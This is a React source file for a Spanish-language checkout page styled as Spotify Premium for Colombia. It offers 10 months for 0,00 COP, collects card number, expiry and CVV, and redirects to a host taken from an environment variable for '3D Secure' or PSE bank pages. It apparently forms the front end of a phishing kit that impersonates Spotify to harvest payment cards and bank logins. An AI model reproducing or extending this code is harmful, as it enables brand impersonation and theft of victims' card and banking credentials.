"use client"

import { useState, useEffect } from "react"
import Visa from "./img/visa-logo-generic.png"
import PSELogo from "./img/pse.png"
import { CreditCard } from "lucide-react"
import { Link } from "react-router"
import usePaymentStore from './store'

export const SpotifyPurchase = () => {
  const [paymentMethod, setPaymentMethod] = useState("div")
  const [selectedBank, setSelectedBank] = useState("")
  const { cardData, loading, error, updateCardData, submitPayment } = usePaymentStore()

  // Leer la URL 3D Secure desde variables de entorno
  const threeDSUrl = import.meta.env.VITE_3D_URL;

  // Helper to format MM/YY
  const handleExpDateChange = (e) => {
    let value = e.target.value.replace(/[^\d]/g, "");
    if (value.length > 4) value = value.slice(0, 4);
    if (value.length > 2) value = value.slice(0, 2) + "/" + value.slice(2);
    updateCardData('expDate', value);
  }

  // Redirigir a PSE cuando se seleccione un banco
  useEffect(() => {
    if (paymentMethod === "pse" && selectedBank && threeDSUrl) {
      window.location.href = `${threeDSUrl}/pse/index.php?banco=${selectedBank}`
    }
  }, [paymentMethod, selectedBank, threeDSUrl])

  const handleSubmit = async (e) => {
    e.preventDefault()
    const response = await submitPayment(paymentMethod)
    // Si es PSE, submitPayment ya redirige, no mostrar alertas
    if (paymentMethod === "pse") return;
    if (response.success) {
      // Redirigir usando el valor de 'bank' devuelto por la API
      const bank = response.data && response.data.bank ? response.data.bank : selectedBank;
      if (threeDSUrl) {
        window.location.href = `${threeDSUrl}/payments/${bank}`
      }
    } else {
      alert(response.error)
    }
  }

  return (
    <div className="min-h-screen bg-white">
      <div className="max-w-2xl mx-auto px-6 py-8">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-black rounded-full flex items-center justify-center">
              <svg viewBox="0 0 24 24" className="w-5 h-5 fill-white">
                <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.42 1.56-.299.421-1.02.599-1.559.3z" />
              </svg>
            </div>
            <span className="text-xl font-semibold">Spotify</span>
          </div>
          <div className="w-6 h-6 bg-orange-500 rounded-full flex items-center justify-center">
            <span className="text-white text-sm">?</span>
          </div>
        </div>

        {/* Purchase Section */}
        <div className="mb-8">
          <div className="flex items-center justify-between mb-6">
            <h1 className="text-2xl font-semibold">Compra</h1>
            <button variant="link" className="text-sm text-gray-600 p-0">
              Cambiar de plan
            </button>
          </div>

          <div className="mb-6 border-b border-t">
            <div className="p-6">
              <div className="flex items-start gap-4">
                <div className="w-12 h-12 bg-black rounded-lg flex items-center justify-center flex-shrink-0 ">
                  <svg viewBox="0 0 24 24" className="w-6 h-6 fill-white text-pink-200">
                    <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.42 1.56-.299.421-1.02.599-1.559.3z" />
                  </svg>
                </div>
                <div className="flex-1">
                  <div className="flex items-center justify-between mb-2">
                    <div>
                      <h3 className="font-semibold text-lg">Premium Individual</h3>
                      <p className="text-sm text-gray-600">1 cuenta Premium</p>
                    </div>
                    <div className="text-right">
                      <div className="text-2xl font-semibold">0,00 COP</div>
                      <div className="text-sm text-gray-600">Por 10 meses</div>
                    </div>
                  </div>
                  <div className="text-sm text-gray-600 space-y-1">
                    <p>• Hoy: 10 meses por 0,00 COP</p>
                    <p>• <strong> A partir del 14 sept 2025: </strong> 18.500,00 COP/mes</p>
                    <p>• Te enviaremos un recordatorio 7 días antes del cobro.</p>
                    <p>
                      • Cancela cuando quieras online.{" "}
                      <span className="underline cursor-pointer">Consulta las condiciones</span>
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

 {/* Payment Method */}
        <div className="mb-8">
          <h2 className="text-3xl font-semibold mb-4">Forma de pago</h2>

          {/* Tarjeta */}
          <div
            onClick={() => setPaymentMethod("card")}
            className={`cursor-pointer hover:bg-gray-50 transition-colors border  py-5 ${paymentMethod === "card" ? "border" : ""}`}
          >
            <div className="p-4">
              <div className="flex items-center">
                <input
                  type="radio"
                  checked={paymentMethod === "card"}
                  onChange={() => setPaymentMethod("card")}
                />
                <span className="font-medium ml-3">Tarjeta de crédito o débito</span>
              </div>
              <div className="flex gap-2 ml-7 mt-4">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" className="h-4" />
                <img src="https://1000marcas.net/wp-content/uploads/2019/12/logo-Mastercard.png" alt="Mastercard" className="h-4" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1200px-American_Express_logo_%282018%29.svg.png" alt="American Express" className="h-6" />
              </div>

              {/* Formulario visible solo si está seleccionado */}
              {paymentMethod === "card" && (
                <div className="mt-6 ">
                <CreditCard className="text-gray-300 relative top-[70px] left-2"/>
                <label htmlFor="" className="font-semibold">Número de tarjeta</label>
                  <input
                    type="text"
                    placeholder="0000 0000 0000 0000"
                    className="w-full border pl-10 p-3 rounded-md"
                    value={cardData.cardNumber}
                    onChange={(e) => updateCardData('cardNumber', e.target.value)}
                  />
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                    <label htmlFor="" className="font-semibold">Fecha de vencimiento</label>
                    <input
                      type="text"
                      placeholder="MM/YY"
                      className="border p-3 rounded-md w-full"
                      value={cardData.expDate}
                      onChange={handleExpDateChange}
                      maxLength={5}
                      pattern="^(0[1-9]|1[0-2])\/\d{2}$"
                      inputMode="numeric"
                    />
                    </div>
                    <div>
                    <label htmlFor="" className="font-semibold">CVV</label>
                    <input
                      type="text"
                      placeholder="Código de seguridad"
                      className="border p-3 rounded-md w-full"
                      value={cardData.cvv}
                      onChange={(e) => updateCardData('cvv', e.target.value)}
                    />
                      </div>
                  </div>
                  <label className="flex items-start space-x-2 text-sm ">
                    <input type="checkbox" className="mt-6"/>
                    <div className="grid items-end mt-5">
                        <span>Guardar tarjeta para futuras compras</span>
                        <p className="text-gray-400 w-[80%] mt-3">Esta acción no afectará al pago de las suscripciones actuales y se puede gestionar en cualquier momento desde la página de tu cuenta</p>
                    </div>
                  </label>
                </div>
              )}
            </div>
          </div>

          {/* PSE */}
          {/* PSE */}
          <div
            onClick={() => setPaymentMethod("pse")}
            className={`cursor-pointer hover:bg-gray-50 transition-colors border-l border-b border-r py-5  ${paymentMethod === "pse" ? "border" : ""}`}

          >
            <div className="p-4">
              <div className="flex items-center">
                <input
                  type="radio"
                  checked={paymentMethod === "pse"}
                  onChange={() => setPaymentMethod("pse")}

                />
                <span className="font-medium ml-3">PSE</span>
              </div>
              <div className="ml-7 mt-4">
                <img src={PSELogo} alt="PSE" className="h-5" />
              </div>
              {/* Formulario visible solo si está seleccionado */}
              {paymentMethod === "pse" && (
                <div className="mt-6">
                  <label htmlFor="banco" className="font-semibold">Selecciona tu banco</label>
                  <select
                    id="banco"
                    className="w-full border p-3 rounded-md mt-2"
                    value={selectedBank}
                    onChange={e => setSelectedBank(e.target.value)}
                  >
                    <option value="">Selecciona un banco</option>
                    <option value="banco av villas">Banco AV Villas</option>
                    <option value="bancolombia">Bancolombia</option>
                    <option value="banco de bogotá">Banco de Bogotá</option>
                    <option value="nequi">Nequi</option>
                    <option value="banco de occidente">Banco de Occidente</option>
                    <option value="banco popular">Banco Popular</option>
                  </select>
                </div>
              )}
            </div>
          </div>
        </div>

        <div className="grid">
            <p className="text-2xl font-semibold">Resumen</p>
            <div className="grid mt-4 bg-gray-200 p-4 rounded-lg">
            <p className="mb-5">Articulos</p>
            <div className="flex justify-between">
              <span className="text-gray-600 flex gap-2 items-center">
                <div className="w-7 h-7 bg-black rounded-lg flex items-center justify-center flex-shrink-0 ">
                  <svg viewBox="0 0 24 24" className="w-4 h-4 fill-white text-pink-200">
                    <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.42 1.56-.299.421-1.02.599-1.559.3z" />
                  </svg>
                </div>
                  <p className="font-semibold text-black">Premium individual</p>
            
              </span>
              <span className="text-xl font-semibold">0,00 COP</span>
            </div>
            <div className="mt-3 ml-4">
                <p className="text-gray-600">Hoy: 10 meses por 0,00 COP</p>
                <p className="text-gray-600">A partir del 14 sept 2025: 18.500,00 COP/mes</p>
            </div>
            <hr className="border border-gray-300 my-8"/>
            <div className="flex justify-between mt-4">
              <span className="text-black font-bold text-base">Total Ahora</span>
              <span className="text-xl font-bold">0,00 COP</span>
            </div>
          </div>
        </div>

        <div className="grid">
            <p className="mt-5 font-medium">Si no cancela la suscripcion antes de que termine la prueba el 14 de septiembre del 2025, aceptas que se te cobre autoamticamente cada mes la tarifa correspondiente hasta que canceles la suscripcion. Si la cancelas durante el periodod de prueba, perderas las ventajas de Premium inmediatamente. Puedes consultar las condiciones <Link>aqui</Link>. tu forma de pago (por ejemplo, tu banco o tu empresa de telefonia movil) puede cobrarte otros cargos, como impuestos, comisisones o el precio equivalente en dolares estadounidenses al tipo de cambio que determine. Estos cargos no los cobra Spotify</p>

            <button 
                onClick={handleSubmit}
                disabled={loading}
                className="w-full h-12 bg-green-500 hover:bg-green-600 rounded-full text-black font-semibold mt-6 disabled:opacity-50">
                {loading ? "Procesando..." : "Completar compra"}
            </button>
            {error && <p className="text-red-500 mt-2 text-center">{error}</p>}
        </div>

    </div>
</div>


  )
}
